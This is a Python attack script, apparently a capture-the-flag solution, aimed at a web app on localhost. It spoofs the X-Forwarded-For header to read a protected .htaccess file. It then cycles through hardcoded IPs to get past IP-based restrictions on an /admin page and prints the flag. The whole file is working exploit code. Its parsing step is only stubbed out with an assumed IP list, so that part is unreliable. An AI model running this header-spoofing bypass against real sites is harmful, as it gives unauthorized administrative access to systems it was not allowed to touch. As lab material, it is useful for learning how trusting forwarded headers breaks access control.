import requests

# Define the target URL
url = 'http://localhost:8080'  # Replace with the actual URL

# IP address obtained from the "robots.txt" file
allowed_ip = '192.168.1.101'  # Replace with the allowed IP address

# Prepare headers with X-Forwarded-For header attack
headers = {
    'X-Forwarded-For': allowed_ip,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}

try:
    # Access the ".htaccess" file by using the X-Forwarded-For header
    response = requests.get(url + '/.htaccess', headers=headers)

    if response.status_code == 200:
        # Successfully accessed the ".htaccess" file
        print('Accessed .htaccess file:')
        print(response.text)

        # Extract the list of allowed IPs from the ".htaccess" file
        # Parse the contents of the file to obtain IP addresses

        # Assume that the list of allowed IPs is stored in a variable named 'allowed_ips'
        allowed_ips = [  '172.16.0.5', '203.0.113.17', '198.51.100.22', '192.0.2.33', '127.0.0.1']

        # Access the admin page using one of the allowed IPs
        admin_url = url + '/admin'  # Replace with the actual admin page URL

        for ip in allowed_ips:
            headers['X-Forwarded-For'] = ip
            admin_response = requests.get(admin_url, headers=headers)

            if admin_response.status_code == 200:
                # Successfully accessed the admin page
                print(f'Successfully accessed admin page with IP: {ip}')
                print('Flag:', admin_response.text)
                break
            else:
                print(f'Failed to access admin page with IP: {ip}')

    else:
        print('Failed to access .htaccess file.')

except Exception as e:
    print('An error occurred:', str(e))
